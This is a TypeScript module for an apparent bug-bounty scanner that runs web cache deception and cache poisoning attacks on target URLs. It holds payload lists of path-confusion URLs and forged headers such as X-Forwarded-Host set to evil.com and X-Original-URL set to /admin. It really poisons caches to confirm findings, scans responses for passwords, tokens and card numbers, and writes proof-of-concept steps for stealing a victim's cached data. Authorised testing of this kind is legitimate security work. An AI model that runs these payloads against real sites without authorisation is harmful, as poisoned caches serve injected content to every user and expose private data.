/**
 * Web Cache Deception Agent
 * Based on PayloadsAllTheThings/Web Cache Deception
 * 
 * Detects and exploits web cache vulnerabilities:
 * - Path confusion attacks
 * - Cache key manipulation
 * - Cache poisoning
 * - Sensitive data caching
 * - CDN bypass
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface CacheDeceptionJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testPathConfusion?: boolean;
    testCacheKey?: boolean;
    testPoisoning?: boolean;
  };
}

// Cache Deception Payloads
const CACHE_PAYLOADS = {
  // Path confusion - append static extension
  pathConfusion: [
    '/account/settings/test.css',
    '/account/settings/test.js',
    '/account/settings/test.png',
    '/account/settings/test.gif',
    '/account/settings/test.ico',
    '/account/settings/test.svg',
    '/account/settings/test.woff',
    '/account/settings/test.woff2',
    '/account/settings/.css',
    '/account/settings/..%2ftest.css',
    '/account/settings/%2e%2e/test.css',
  ],

  // Static file extensions that are typically cached
  staticExtensions: [
    '.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico',
    '.svg', '.woff', '.woff2', '.ttf', '.eot', '.pdf',
    '.mp3', '.mp4', '.webp', '.avif',
  ],

  // Cache key manipulation
  cacheKeyManipulation: [
    // Port manipulation
    { header: 'X-Forwarded-Port', value: '1337' },
    { header: 'X-Forwarded-Host', value: 'evil.com' },
    // Scheme manipulation
    { header: 'X-Forwarded-Scheme', value: 'nothttps' },
    { header: 'X-Forwarded-Proto', value: 'nothttps' },
    // Origin manipulation
    { header: 'X-Original-URL', value: '/admin' },
    { header: 'X-Rewrite-URL', value: '/admin' },
  ],

  // Cache poisoning headers
  poisoningHeaders: [
    { header: 'X-Forwarded-Host', value: 'evil.com' },
    { header: 'X-Host', value: 'evil.com' },
    { header: 'X-Forwarded-Server', value: 'evil.com' },
    { header: 'X-Original-URL', value: '/evil' },
    { header: 'X-Rewrite-URL', value: '/evil' },
  ],

  // Sensitive endpoints to test
  sensitiveEndpoints: [
    '/account',
    '/profile',
    '/settings',
    '/dashboard',
    '/api/user',
    '/api/me',
    '/my-account',
    '/user/profile',
  ],
};

export class WebCacheDeceptionAgent extends BaseAgent<CacheDeceptionJob> {
  constructor() {
    super('webcachedeception');
  }

  protected getSteps() {
    return [
      { name: 'Identify cacheable endpoints', metadata: {} },
      { name: 'Test path confusion attacks', metadata: {} },
      { name: 'Test cache key manipulation', metadata: {} },
      { name: 'Verify sensitive data caching', metadata: {} },
      { name: 'Test cache poisoning', metadata: {} },
    ];
  }

  async process(job: Job<CacheDeceptionJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];

    logger.info({ urlCount: urls.length }, 'Starting web cache deception testing');

    for (const url of urls) {
      try {
        // Test path confusion
        if (options.testPathConfusion !== false) {
          const pathFindings = await this.testPathConfusion(url);
          findings.push(...pathFindings);
        }

        // Test cache key manipulation
        if (options.testCacheKey !== false) {
          const keyFindings = await this.testCacheKeyManipulation(url);
          findings.push(...keyFindings);
        }

        // Test cache poisoning
        if (options.testPoisoning) {
          const poisonFindings = await this.testCachePoisoning(url);
          findings.push(...poisonFindings);
        }

        // Check for sensitive data in cached responses
        const sensitiveFindings = await this.checkSensitiveDataCaching(url);
        findings.push(...sensitiveFindings);
      } catch (error) {
        logger.error({ error, url }, 'Error testing cache deception');
      }
    }

    // Store findings
    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    return {
      totalUrls: urls.length,
      findings: findings.length,
      vulnerabilities: findings,
    };
  }

  private async testPathConfusion(baseUrl: string): Promise<any[]> {
    const findings: any[] = [];
    const urlObj = new URL(baseUrl);
    const base = `${urlObj.protocol}//${urlObj.host}`;

    for (const endpoint of CACHE_PAYLOADS.sensitiveEndpoints) {
      for (const ext of CACHE_PAYLOADS.staticExtensions) {
        try {
          // First request - authenticated (would need session)
          const confusedPath = `${endpoint}/anything${ext}`;
          const testUrl = `${base}${confusedPath}`;

          const response1 = await fetch(testUrl);
          const body1 = await response1.text();

          // Check cache headers
          const cacheControl = response1.headers.get('cache-control') || '';
          const xCache = response1.headers.get('x-cache') || '';
          const cfCacheStatus = response1.headers.get('cf-cache-status') || '';
          const age = response1.headers.get('age');

          // Check if response contains sensitive data AND is cached
          const hasSensitiveData = this.containsSensitiveData(body1);
          const isCached = xCache.includes('HIT') || cfCacheStatus === 'HIT' || 
                          age !== null || !cacheControl.includes('no-store');

          if (hasSensitiveData && isCached) {
            findings.push({
              type: 'web-cache-deception',
              url: testUrl,
              severity: 'high',
              evidence: 'Sensitive data returned with cacheable response',
              cacheHeaders: { cacheControl, xCache, cfCacheStatus, age },
              impact: 'Attacker can cache victim\'s sensitive data',
              poc: `
1. Send victim link: ${testUrl}
2. Wait for victim to click
3. Access same URL to retrieve cached sensitive data
`,
            });
          }

          // Check if path confusion works (returns same content as original)
          const originalResponse = await fetch(`${base}${endpoint}`);
          const originalBody = await originalResponse.text();

          if (body1.length > 100 && Math.abs(body1.length - originalBody.length) < 100) {
            findings.push({
              type: 'path-confusion-detected',
              url: testUrl,
              originalUrl: `${base}${endpoint}`,
              severity: 'medium',
              evidence: 'Path confusion returns same content as original endpoint',
            });
          }
        } catch (error) {
          // Continue
        }
      }
    }

    return findings;
  }

  private async testCacheKeyManipulation(url: string): Promise<any[]> {
    const findings: any[] = [];

    for (const { header, value } of CACHE_PAYLOADS.cacheKeyManipulation) {
      try {
        // Request with manipulated header
        const response1 = await fetch(url, {
          headers: { [header]: value },
        });

        const xCache1 = response1.headers.get('x-cache') || '';
        const body1 = await response1.text();

        // Request without header
        const response2 = await fetch(url);
        const xCache2 = response2.headers.get('x-cache') || '';
        const body2 = await response2.text();

        // Check if header affects cache key
        if (xCache1 !== xCache2 || body1 !== body2) {
          findings.push({
            type: 'cache-key-manipulation',
            url,
            header,
            value,
            severity: 'medium',
            evidence: `${header} header affects cache behavior`,
            impact: 'Potential cache poisoning or bypass',
          });
        }

        // Check if header is reflected (cache poisoning)
        if (body1.includes(value)) {
          findings.push({
            type: 'cache-poisoning-potential',
            url,
            header,
            value,
            severity: 'high',
            evidence: `${header} value reflected in response`,
            impact: 'Cache poisoning - inject malicious content',
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testCachePoisoning(url: string): Promise<any[]> {
    const findings: any[] = [];
    const cacheBuster = `cb=${Date.now()}`;
    const testUrl = `${url}${url.includes('?') ? '&' : '?'}${cacheBuster}`;

    for (const { header, value } of CACHE_PAYLOADS.poisoningHeaders) {
      try {
        // Poison the cache
        const poisonResponse = await fetch(testUrl, {
          headers: { [header]: value },
        });

        const poisonBody = await poisonResponse.text();

        // Check if poisoned
        if (poisonBody.includes(value)) {
          // Verify cache was poisoned
          const verifyResponse = await fetch(testUrl);
          const verifyBody = await verifyResponse.text();

          if (verifyBody.includes(value)) {
            findings.push({
              type: 'cache-poisoning-confirmed',
              url: testUrl,
              header,
              value,
              severity: 'critical',
              evidence: 'Poisoned response served from cache',
              impact: 'XSS, phishing, or malware distribution to all users',
            });
          }
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async checkSensitiveDataCaching(url: string): Promise<any[]> {
    const findings: any[] = [];

    try {
      const response = await fetch(url);
      const body = await response.text();
      const cacheControl = response.headers.get('cache-control') || '';

      // Check for sensitive data
      if (this.containsSensitiveData(body)) {
        // Check cache headers
        if (!cacheControl.includes('no-store') && !cacheControl.includes('private')) {
          findings.push({
            type: 'sensitive-data-cacheable',
            url,
            severity: 'medium',
            evidence: 'Sensitive data in response without no-store/private cache directive',
            cacheControl,
            recommendation: 'Add Cache-Control: no-store, private',
          });
        }
      }
    } catch (error) {
      // Continue
    }

    return findings;
  }

  private containsSensitiveData(body: string): boolean {
    const sensitivePatterns = [
      /email["']?\s*[:=]\s*["'][^"']+@[^"']+["']/i,
      /password/i,
      /api[_-]?key/i,
      /access[_-]?token/i,
      /bearer\s+[a-zA-Z0-9]/i,
      /credit[_-]?card/i,
      /ssn/i,
      /social[_-]?security/i,
      /"balance"\s*:/i,
      /"account[_-]?number"/i,
    ];

    return sensitivePatterns.some(pattern => pattern.test(body));
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding)]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store cache deception finding');
    }
  }
}

export default new WebCacheDeceptionAgent();
